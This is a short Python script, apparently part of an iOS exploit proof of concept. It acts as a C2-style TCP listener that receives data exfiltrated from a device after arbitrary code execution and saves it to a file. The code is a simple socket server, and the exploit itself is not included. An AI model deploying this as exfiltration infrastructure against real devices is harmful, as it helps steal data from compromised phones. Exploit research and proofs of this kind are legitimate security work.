#!/usr/bin/env python3
"""Tiny LAN listener for an iOS in-process exfil proof.

The widget itself has no network API.  This listener is only for the *post-ACE*
stage: once the payload can call libc sockets / stdio, point it at the host's
LAN address and this port.  No third-party tunnel, no public relay.

Usage:
  python3 c2_listener.py --port 4445 --out /tmp/opencode/ios_exfil.bin
  # then on the device, the payload connects to <host-LAN-ip>:4445

It accepts one connection at a time, prints received bytes as text (or hex),
and writes everything to --out.
"""

import argparse
import socket
import sys
import time


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=4445)
    ap.add_argument("--out", default="/tmp/opencode/ios_exfil.bin")
    ap.add_argument("--once", action="store_true", help="exit after one connection")
    ap.add_argument("--ack", default="", help="optional bytes to send back")
    args = ap.parse_args()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((args.host, args.port))
    srv.listen(4)
    print("listening on %s:%d -> %s" % (args.host, args.port, args.out))
    sys.stdout.flush()

    with open(args.out, "ab", buffering=0) as out:
        while True:
            conn, addr = srv.accept()
            print("\n[%s] connection from %s:%d" %
                  (time.strftime("%H:%M:%S"), addr[0], addr[1]))
            sys.stdout.flush()
            if args.ack:
                conn.sendall(args.ack.encode())
            n = 0
            while True:
                data = conn.recv(65536)
                if not data:
                    break
                n += len(data)
                out.write(data)
                try:
                    sys.stdout.write(data.decode("utf-8", "replace"))
                except Exception:
                    sys.stdout.write(data.hex())
                sys.stdout.flush()
            conn.close()
            print("\n[%s] closed, %d bytes" % (time.strftime("%H:%M:%S"), n))
            sys.stdout.flush()
            if args.once:
                break
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
